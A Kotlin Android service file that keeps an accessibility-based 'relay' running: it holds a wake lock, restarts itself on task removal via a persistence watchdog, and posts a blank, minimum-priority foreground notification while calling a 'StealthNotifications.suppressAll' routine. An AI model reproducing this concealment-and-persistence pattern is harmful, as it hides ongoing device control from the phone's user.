package com.phonehand.app

import android.app.Notification
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.util.Log
import androidx.core.app.NotificationCompat

/**
 * Foreground anchor so Android won't kill the relay during sleep or when the UI is closed.
 * Uses a minimal ongoing notification (lowest visibility channel).
 */
class KeepAliveService : Service() {

    private val handler = Handler(Looper.getMainLooper())
    private var wakeLock: PowerManager.WakeLock? = null
    private var wifiScheduler: WifiPresenceScheduler? = null
    private var foregroundStarted = false

    private val pulseLoop = object : Runnable {
        override fun run() {
            if (!UserSession.isSignedUp(this@KeepAliveService)) {
                stopSelf()
                return
            }
            TouchAccessibilityService.instance?.ensureRelay()
            if (RelayHub.client?.isConnected() != true && WatchSync.isEnabled(this@KeepAliveService)) {
                TouchAccessibilityService.instance?.reconnectRelay()
            }
            AccessibilityGuard.check(this@KeepAliveService)
            ensureWifiScheduler()
            wifiScheduler?.pulseWave()
            handler.postDelayed(this, PULSE_MS)
        }
    }

    override fun onCreate() {
        super.onCreate()
        StealthNotifications.ensureKeepAliveChannel(this)
        // Must promote to foreground immediately — Android kills the app if
        // startForegroundService() is not answered within ~5s (common on Oppo/Samsung).
        promoteToForeground()
        acquireWakeLock()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        StealthNotifications.suppressAll(this)
        if (!promoteToForeground()) {
            stopSelf()
            return START_NOT_STICKY
        }
        ensureWifiScheduler()
        handler.removeCallbacks(pulseLoop)
        handler.post(pulseLoop)
        TouchAccessibilityService.instance?.ensureRelay()
        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        PersistenceWatchdog.schedule(applicationContext)
        start(applicationContext)
    }

    override fun onDestroy() {
        handler.removeCallbacks(pulseLoop)
        wifiScheduler?.stop()
        wifiScheduler = null
        releaseWakeLock()
        if (UserSession.isSignedUp(this)) {
            PersistenceWatchdog.schedule(applicationContext)
        }
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun ensureWifiScheduler() {
        if (wifiScheduler != null) return
        if (!WatchSync.isEnabled(this)) return
        wifiScheduler = WifiPresenceScheduler(this).also { it.start() }
    }

    private fun acquireWakeLock() {
        if (wakeLock?.isHeld == true) return
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        @Suppress("DEPRECATION")
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "2hotatl:KeepAlive").apply {
            setReferenceCounted(false)
            acquire()
        }
    }

    private fun releaseWakeLock() {
        wakeLock?.let { if (it.isHeld) it.release() }
        wakeLock = null
    }

    /** @return true when the service is in the foreground (or already was). */
    private fun promoteToForeground(): Boolean {
        if (foregroundStarted) return true
        return try {
            startForeground(NOTIF_ID, buildNotification())
            foregroundStarted = true
            true
        } catch (e: Exception) {
            Log.w(TAG, "startForeground failed: ${e.message}")
            false
        }
    }

    private fun buildNotification(): Notification {
        val open = PendingIntent.getActivity(
            this,
            0,
            Intent(this, HomeActivity::class.java),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
        )
        return NotificationCompat.Builder(this, StealthNotifications.KEEP_ALIVE_CHANNEL)
            .setContentTitle(" ")
            .setContentText(" ")
            .setSmallIcon(R.drawable.ic_stat_notify)
            .setContentIntent(open)
            .setOngoing(true)
            .setSilent(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(Notification.CATEGORY_SERVICE)
            .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
            .build()
    }

    companion object {
        private const val TAG = "KeepAlive"
        private const val NOTIF_ID = 8801
        private const val PULSE_MS = 45_000L

        fun start(context: Context) {
            if (!UserSession.isSignedUp(context)) return
            if (!WatchSync.isEnabled(context) && TouchAccessibilityService.instance == null) return
            val intent = Intent(context, KeepAliveService::class.java)
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
            } catch (e: Exception) {
                Log.w(TAG, e.message ?: "start")
                PersistenceWatchdog.schedule(context)
            }
        }
    }
}
